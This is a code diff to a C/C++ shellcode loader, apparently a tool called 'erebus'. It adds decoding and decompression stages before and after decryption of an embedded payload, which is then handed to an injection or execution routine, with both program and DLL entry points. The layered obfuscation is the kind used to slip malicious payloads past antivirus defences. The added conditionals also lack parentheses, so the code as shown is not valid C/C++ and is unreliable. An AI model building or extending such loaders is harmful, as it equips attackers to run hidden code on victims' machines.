@@ -10,6 +10,8 @@ VOID entry(void)
 	// 1. Configure Injection Method based on Config
 	erebus::config.injection_method = ExecuteShellcode;
 	erebus::config.decryption_method = DecryptShellcode;
+	erebus::config.decompression_method = DecompressShellcode;
+	erebus::config.decode_method = DecodeShellcode;
 
 	HANDLE process_handle = NULL;
 	HANDLE thread_handle = NULL;
@@ -29,11 +31,29 @@ VOID entry(void)
 	memcpy(pPayload, shellcode, shellcode_size);
 
 	// ============================================================
-	// 1. DECRYPT (Main handles Key)
+	// 1. DEOBFUSCATE
 	// ============================================================
+
+	if CONFIG_ENCODING_TYPE != 0 {
+		BYTE* pDecoded = NULL;
+		SIZE_T sDecodedSize = 0;
+		if (erebus::config.decode_method((CHAR*)pPayload, shellcode_size, &pDecoded, &sDecodedSize)) 
+		{
+			free(pPayload);
+			pPayload = pDecoded;
+			shellcode_size = sDecodedSize;
+		} else {
+			free(pPayload);
+			return; // Decoding failed
+		}
+	}
 
 	if (sizeof(key) > 0 && key[0] != 0x00 && CONFIG_ENCRYPTION_TYPE != 0) {
 		erebus::config.decryption_method(pPayload, shellcode_size, key, sizeof(key));
+	}
+
+	if CONFIG_COMPRESSION_TYPE != 0 {
+		erebus::config.decompression_method(&pPayload, &shellcode_size);
 	}
 
 	// ============================================================
@@ -75,7 +95,7 @@ int main()
 	return 0;
 }
 
-#elif _WINDLL
+#elif _WINDLL 
 BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved)
 {
 	switch (ul_reason_for_call)
